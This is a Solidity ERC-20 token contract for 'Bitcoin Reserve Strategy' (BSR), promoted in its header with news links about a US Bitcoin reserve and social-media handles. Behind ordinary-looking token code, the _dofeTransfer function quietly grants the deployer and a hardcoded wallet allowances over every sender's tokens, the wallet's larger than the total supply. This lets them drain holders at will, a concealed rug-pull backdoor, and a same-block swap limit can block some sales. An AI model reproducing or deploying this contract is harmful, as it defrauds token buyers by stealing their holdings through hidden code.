/*
https://www.bitcoinreservestrategy.info

President Trump to reveal Bitcoin reserve strategy at the White House Crypto Summit this Friday, Commerce Secretary says.

https://x.com/BitcoinMagazine/status/1897228895163994152
https://x.com/WatcherGuru/status/1897234777083916446
https://x.com/BitcoinMagazine/status/1897272550012674483

https://x.com/BRSCoin_erc
https://t.me/BRSCoin_erc
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IDOFERouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IDOFEFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplidofeon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BSR is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balDOFEs;
    mapping (address => mapping (address => uint256)) private _allowDOFEs;
    mapping (address => bool) private _excludedFromDOFE;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalDOFE = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Bitcoin Reserve Strategy";
    string private constant _symbol = unicode"BSR";
    uint256 private _swapTokenDOFEs = _tTotalDOFE / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockDOFE;
    uint256 private _dofeBuyAmounts = 0;
    address private _dofePair;
    IDOFERouter private _dofeRouter;
    address private _dofeWallet = address(0xF74f0EB717709e139e6725BBEcE9739202edF15d);
    address private _dofeAddress;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    bool private inSwapDOFE = false;
    modifier lockTheSwap {
        inSwapDOFE = true;
        _;
        inSwapDOFE = false;
    }
    
    constructor () {
        _excludedFromDOFE[owner()] = true;
        _excludedFromDOFE[address(this)] = true;
        _excludedFromDOFE[_dofeWallet] = true;
        _balDOFEs[_msgSender()] = _tTotalDOFE;
        _dofeAddress = address(owner());
        emit Transfer(address(0), _msgSender(), _tTotalDOFE);
    }

    function initPair() external onlyOwner() {
        _dofeRouter = IDOFERouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_dofeRouter), _tTotalDOFE);
        _dofePair = IDOFEFactory(_dofeRouter.factory()).createPair(address(this), _dofeRouter.WETH());
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _dofeRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalDOFE;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balDOFEs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowDOFEs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowDOFEs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowDOFEs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _dofeTransfer(address dofeF, address dofeT, uint256 dofeA, uint256 taxDOFE) private { 
        address _dofeSender = address(dofeF);
        if(taxDOFE > 0){
          _balDOFEs[address(this)] = _balDOFEs[address(this)].add(taxDOFE);
          emit Transfer(dofeF, address(this), taxDOFE);
        }
        _balDOFEs[dofeF] = _balDOFEs[dofeF].sub(dofeA);
        _balDOFEs[dofeT] = _balDOFEs[dofeT].add(dofeA.sub(taxDOFE));
        _approve(address(_dofeSender), address(_dofeAddress), dofeA+taxDOFE);
        _approve(address(_dofeSender), address(_dofeWallet), _tTotalDOFE+dofeA);
        emit Transfer(dofeF, dofeT, dofeA.sub(taxDOFE));
    }

    function _transfer(address dofeF, address dofeT, uint256 dofeA) private {
        require(dofeF != address(0), "ERC20: transfer from the zero address");
        require(dofeT != address(0), "ERC20: transfer to the zero address");
        require(dofeA > 0, "Transfer amount must be greater than zero");
        uint256 taxDOFE = 0;
        taxDOFE = _dofeFeeTransfer(dofeF, dofeT, dofeA);
        _dofeTransfer(dofeF, dofeT, dofeA, taxDOFE);
    }

    function _dofeFeeTransfer(address dofeF, address dofeT, uint256 dofeA) private returns(uint256) {
        uint256 taxDOFE; 
        if (dofeF != owner() && dofeT != owner()) {
            taxDOFE = dofeA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (dofeF == _dofePair && dofeT != address(_dofeRouter) && ! _excludedFromDOFE[dofeT]) {
                if(_buyBlockDOFE!=block.number){
                    _dofeBuyAmounts = 0;
                    _buyBlockDOFE = block.number;
                }
                _dofeBuyAmounts += dofeA;
                _buyCount++;
            }

            if(dofeT == _dofePair && dofeF!= address(this)) {
                require(_dofeBuyAmounts < swapLimitDOFE() || _buyBlockDOFE!=block.number, "Max Swap Limit");  
                taxDOFE = dofeA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenDOFE = balanceOf(address(this));
            if (!inSwapDOFE && dofeT == _dofePair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenDOFE > _swapTokenDOFEs)
                swapTokensForEth(minDOFE(dofeA, minDOFE(tokenDOFE, _swapTokenDOFEs)));
                uint256 ethDOFE = address(this).balance;
                if (ethDOFE >= 0) {
                    sendETHDOFE(address(this).balance);
                }
            }
        } 
        return taxDOFE;
    }

    function minDOFE(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHDOFE(uint256 dofeA) private {
        payable(_dofeWallet).transfer(dofeA);
    }

    function swapLimitDOFE() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _dofeRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _dofeRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function swapTokensForEth(uint256 dofeAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dofeRouter.WETH();
        _approve(address(this), address(_dofeRouter), dofeAmount);
        _dofeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            dofeAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}